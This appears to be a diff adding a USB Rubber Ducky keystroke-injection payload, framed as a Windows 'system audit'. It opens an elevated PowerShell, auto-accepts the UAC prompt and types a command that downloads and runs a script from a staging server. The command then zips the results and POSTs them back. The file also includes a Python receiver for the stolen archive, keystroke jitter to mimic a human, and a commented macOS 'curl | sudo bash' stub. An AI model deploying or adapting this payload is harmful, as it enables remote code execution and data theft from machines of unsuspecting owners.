@@ -1,0 +1,123 @@
+REM ================================================================
+REM  Payload     : SysAudit Windows Audit
+REM  Description : Opens an elevated PowerShell session, downloads
+REM                SysAudit.ps1 from a staging server, executes the
+REM                full system audit, compresses results, and exfils
+REM                the ZIP back to the staging server via HTTP POST.
+REM                Results are also retained at C:\SysAudit\ on target.
+REM  Target OS   : Windows 7 SP1+ (PowerShell 3.0+ required)
+REM  Author      : [Operator]
+REM  Device      : USB Rubber Ducky 2022
+REM
+REM  NOTE: payload.txt must be compiled to inject.bin with Payload Studio
+REM        before deployment: https://payloadstudio.hak5.org
+REM
+REM  Pre-deployment checklist:
+REM    1. Set $SERVER to your staging server address (no trailing slash)
+REM    2. Host SysAudit.ps1 at http://$SERVER/SysAudit.ps1
+REM       (copy from scripts/SysAudit.ps1 in your operator machine)
+REM    3. Run an HTTP POST receiver at http://$SERVER/upload
+REM       Example receiver (Python 3):
+REM         python3 -c "
+REM           import http.server, os
+REM           class H(http.server.BaseHTTPRequestHandler):
+REM             def do_POST(self):
+REM               n=int(self.headers['Content-Length'])
+REM               open('audit_results.zip','wb').write(self.rfile.read(n))
+REM               self.send_response(200); self.end_headers()
+REM           http.server.HTTPServer(('',80),H).serve_forever()"
+REM    4. Compile to inject.bin, copy to Ducky USB root
+REM    5. Eject, insert into target, wait ~3-5 minutes for completion
+REM
+REM  Execution flow:
+REM    GUI+r → Run dialog
+REM    "powershell" + Ctrl+Shift+Enter → Elevated PowerShell (UAC)
+REM    Alt+Y → Accept UAC prompt
+REM    Typed PS compound command:
+REM      1. Download SysAudit.ps1 → C:\Windows\Temp\sa.ps1
+REM      2. Set-ExecutionPolicy Bypass (process scope)
+REM      3. Run audit with -SkipMsiProducts (avoids slow Win32_Product scan)
+REM      4. Compress C:\SysAudit\ output → C:\Windows\Temp\sa.zip
+REM         (uses .NET ZipFile; requires .NET 4.5 / PS 3.0+)
+REM      5. POST sa.zip to staging server /upload endpoint
+REM      6. Remove temp files
+REM      7. Close PowerShell window
+REM
+REM  PS variable note:
+REM    Only $SERVER (a DuckyScript VAR) appears in STRING commands.
+REM    All other references use .NET static methods or PS cmdlets
+REM    that take string literals, avoiding DuckyScript variable
+REM    expansion conflicts with PowerShell's own $-prefixed variables.
+REM ================================================================
+
+REM ---- CONFIGURATION — edit before compiling ----------------------
+VAR $SERVER = http://192.168.1.100
+
+REM ---- Human emulation: randomise keystroke timing ----------------
+JITTER_ENABLED TRUE
+JITTER_MAX 20
+
+REM ---- LED: blue = device active / waiting ------------------------
+LED_R 0 0 255
+
+REM ---- Wait for USB enumeration and OS to stabilise ---------------
+DELAY 2000
+
+REM ---- OS detection: only proceed on Windows ----------------------
+EXTENSION PASSIVE_WINDOWS_DETECT
+    OS WINDOWS
+
+    REM Open the Run dialog (Win+R)
+    GUI r
+    DELAY 600
+
+    REM Type "powershell" then Ctrl+Shift+Enter to request elevation.
+    REM This triggers a UAC consent dialog.
+    STRING powershell
+    DELAY 300
+    CTRL SHIFT ENTER
+    DELAY 2500
+
+    REM Accept the UAC elevation prompt.
+    REM On standard UAC settings the "Yes" button receives Alt+Y focus.
+    REM Increase DELAY above if the target machine is slow to display UAC.
+    ALT y
+    DELAY 2500
+
+    REM LED: yellow = attack in progress
+    LED_R 255 200 0
+
+    REM Compound PowerShell command typed as a single line.
+    REM Semicolons chain commands sequentially; each step only runs
+    REM if the previous one succeeds (they share the PS session scope).
+    REM
+    REM Step 1: Download SysAudit.ps1 to a writable temp location.
+    REM Step 2: Bypass execution policy for this process only.
+    REM Step 3: Run the audit, skipping the slow Win32_Product WMI scan.
+    REM Step 4: Load .NET ZipFile and compress the audit output directory.
+    REM         -EA 0 silences errors if the assembly is already loaded.
+    REM Step 5: POST the zip to the staging server's /upload endpoint.
+    REM         iwr -InFile sends the file as the raw request body.
+    REM Step 6: Remove temp files regardless of prior step outcomes.
+    REM Step 7: Close the elevated PowerShell window.
+    STRING iwr $SERVER/SysAudit.ps1 -OutFile C:\Windows\Temp\sa.ps1 -UseBasicParsing; Set-ExecutionPolicy Bypass -Scope Process -Force; & C:\Windows\Temp\sa.ps1 -SkipMsiProducts; Add-Type -Assembly System.IO.Compression.FileSystem -EA 0; try{[IO.Compression.ZipFile]::CreateFromDirectory('C:\SysAudit','C:\Windows\Temp\sa.zip')}catch{Compress-Archive C:\SysAudit\* C:\Windows\Temp\sa.zip -Force -EA 0}; iwr $SERVER/upload -Method Post -InFile C:\Windows\Temp\sa.zip -UseBasicParsing -EA 0; Remove-Item C:\Windows\Temp\sa.ps1,C:\Windows\Temp\sa.zip -Force -EA 0; exit
+    ENTER
+
+    REM LED: green = payload injected successfully
+    REM (audit continues running in background — results arrive at server)
+    LED_R 0 255 0
+
+END_EXTENSION
+
+REM ---- macOS stub (extend if needed) ------------------------------
+EXTENSION PASSIVE_WINDOWS_DETECT
+    OS MACOS
+    REM macOS: open Terminal, run SysAudit_macos.sh from a staging server.
+    REM Uncomment and adapt if macOS targets are in scope.
+    REM GUI SPACE
+    REM DELAY 800
+    REM STRING Terminal
+    REM ENTER
+    REM DELAY 1200
+    REM STRINGLN curl -s $SERVER/SysAudit_macos.sh | sudo bash
+END_EXTENSION
